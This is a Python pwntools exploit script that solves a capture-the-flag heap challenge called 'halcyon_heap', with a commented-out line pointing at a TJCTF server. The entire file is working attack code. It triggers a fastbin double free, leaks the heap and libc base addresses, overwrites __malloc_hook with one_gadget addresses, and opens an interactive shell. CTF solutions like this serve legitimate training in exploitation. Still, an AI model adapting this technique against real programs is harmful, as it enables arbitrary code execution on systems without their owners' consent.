import subprocess
from pwn import *

def sice(size, payload):
	r.sendlineafter('> ', '1')
	r.sendlineafter('> ', str(size))
	r.sendafter('> ', payload)

def observe(idx, size):
	r.sendlineafter('> ', '2')
	r.sendlineafter('> ', str(idx))
	return r.recv(size)

def destroy(idx):
	r.sendlineafter('> ', '3')
	r.sendlineafter('> ', str(idx))

target = ELF('./halcyon_heap')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
MAIN_ARENA = 0x399b00
# libc = ELF('./libc.so.6')
# MAIN_ARENA = 0x3c4b20

one_gadgets = map(int, subprocess.check_output(['one_gadget', '--raw', '-l', '1', '/lib/x86_64-linux-gnu/libc.so.6']).split())
# one_gadgets = map(int, subprocess.check_output(['one_gadget', '--raw', './libc.so.6']).split())

for one_gadget in one_gadgets:
	r = process('./halcyon_heap')
	# r = remote('p1.tjctf.org', 8002)

	sice(0x68, 'A')
	sice(0x68, 'B')
	sice(0x18, 'hoge')
	sice(0x18, 'hoge')

	destroy(0)
	destroy(1)
	destroy(0)

	HEAP_BASE = u64(observe(1, 8))
	log.info('HEAP_BASE: ' + hex(HEAP_BASE))

	sice(0x68, p64(HEAP_BASE + 0x60) + 'A' * 0x50 + p64(0x71) + p64(HEAP_BASE))
	sice(0x68, 'hoge')
	sice(0x68, p64(HEAP_BASE))
	sice(0x68, 'A' * 0x8 + p64(0x91))

	destroy(1)

	LIBC_BASE = u64(observe(1, 8)) - (MAIN_ARENA + 0x58)
	log.info('LIBC_BASE: ' + hex(LIBC_BASE))

	sice(0x68, p64(LIBC_BASE + libc.symbols['__malloc_hook'] - 0x10 - 0x13))
	sice(0x68, 'hoge')
	sice(0x68, '\x00' * 0x13 + p64(LIBC_BASE + one_gadget))

	r.interactive()
